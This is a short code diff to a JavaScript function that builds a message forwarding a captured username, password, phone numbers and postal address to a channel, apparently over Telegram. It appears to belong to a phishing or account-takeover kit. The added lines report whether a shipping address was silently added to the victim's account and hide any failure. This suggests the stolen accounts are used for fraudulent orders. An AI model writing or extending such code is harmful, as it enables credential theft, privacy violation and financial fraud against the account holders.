@@ -94,9 +94,21 @@ function buildChannelForwardMessage({ username, password, capture = {} }) {
     if (profile.mobilePhone) lines.push(`  ${boldV2('Mobile')}: ${escapeV2(profile.mobilePhone)}`);
     if (profile.homePhone) lines.push(`  ${boldV2('Home')}: ${escapeV2(profile.homePhone)}`);
     if (profile.postalCode) {
-      const addr = [profile.postalCode, profile.prefecture, profile.city, profile.address1].filter(Boolean).join(' ');
+      const addr = [profile.postalCode, profile.state, profile.city, profile.addressLine1].filter(Boolean).join(' ');
       if (addr) lines.push(`  ${boldV2('Address')}: ${escapeV2(addr)}`);
     }
+    
+    // Shipping address addition status
+    const addrInfo = capture.addressAddition;
+    if (addrInfo) {
+      if (addrInfo.success && addrInfo.alreadyExisted) {
+        lines.push(`  📮 ${escapeV2('Shipping: already set')}`);
+      } else if (addrInfo.success) {
+        lines.push(`  📮 ${escapeV2('Shipping: added')}`);
+      }
+      // On failure, don't show anything (silent)
+    }
+    
     lines.push('');
   }
   
